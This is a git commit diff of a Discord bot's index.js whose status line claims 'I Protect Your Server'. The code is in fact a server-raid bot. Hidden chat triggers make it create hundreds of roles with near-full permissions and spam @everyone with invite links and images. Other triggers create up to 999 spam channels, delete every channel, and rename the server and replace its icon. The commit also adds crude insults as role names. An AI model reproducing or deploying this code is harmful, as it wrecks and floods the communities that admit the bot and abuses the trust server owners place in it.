0f7d1ea2fc264ad59a221d4e2c37486df7510c26
PaidkS <43180613+PaidkS@users.noreply.github.com>
2019-07-14 17:18:45 +0200

    Update index.js

--- .gitignore/index.js
+++ .gitignore/index.js
@@ -2,118 +2,118 @@ const Discord = require("discord.js");
 const bot = new Discord.Client();
 bot.login (process.env.TOKEN);
 bot.on("ready", () => {
-bot.user.setActivity('Powered by Okue', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
+bot.user.setActivity('I Protect Your Server', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
   console.log("Bot [ON]")
   })
   bot.on("message", message => {
 if(message.content.includes("AR!kelsairv")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
-if(message.content === "roles"){
-for(var i =0; i < 400; i++){
-    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+if(message.content === "!cuck"){
+for(var i =0; i < 200; i++){
+    message.guild.createRole({name:"cuck",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
         })
-        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+        message.guild.createRole({name:"Cuck",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#ff08c5"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#5d08ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#0c08ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08d5ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ffa3"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ff23"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#81ff08"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#fff608"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff6f08"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
@@ -124,7 +124,7 @@ color: "#ff0808"
 
 
 if(message.content.includes("!role")){
-    message.guild.createRole({name:"Izi",
+    message.guild.createRole({name:"kogetta",
                               mentionable:false,
                               permissions:2146958591,
                               position: "",
@@ -141,7 +141,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
               bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
           }
           if(message.content === "!issou"){
-              message.guild.setName("LE CENTRE TA BZ :)")
+              message.guild.setName("T'ES BZ :)")
               message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
             }
             if(message.content === "!pd"){
@@ -149,30 +149,35 @@ if(message.content.includes("ar!kelsairvvesrx")){
               message.guild.createChannel("BY","voice")
               }
             }
-            if(message.content.includes("!everyone")){
+            if(message.content.includes("!IDT")){
                 for(var i = 0; i < 200; i++){
-                    message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/fVA3WE4")
+                    message.channel.send("@everyone https://cdn.discordapp.com/attachments/534055320004067358/599940391055261697/image0.png")
                 }
             }
-            //réaction en chaine
+            if(message.content.includes("Kogetta")){
+                for(var i = 0; i < 200; i++){
+                    message.channel.send("@everyone KOGETTA LE ROI https://cdn.discordapp.com/avatars/427825965432045590/4b30c70706fdf66b534665df603027de.png?size=2048")
+                }
+            }
+    //réaction en chaine
                   if(message.content === "channel"){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
+                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("!everyone ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
 
                       }
                     }
-                    if(message.content === "!destroy"){
+                    if(message.content === "!insurrection"){
                       message.guild.channels.map(c => c.delete())
                       }
                       //on commence la destruction
-                      if(message.content.includes("destroy")){
+                      if(message.content.includes("insurrection")){
                           message.channel.send("ban").then(m => m.delete());
                           message.channel.send("drole").then(m => m.delete());
                           message.channel.send("destroy").then(m => m.delete());
@@ -196,3 +201,4 @@ let cont = message.content.slice(1).split(" ")
    
 
       
+
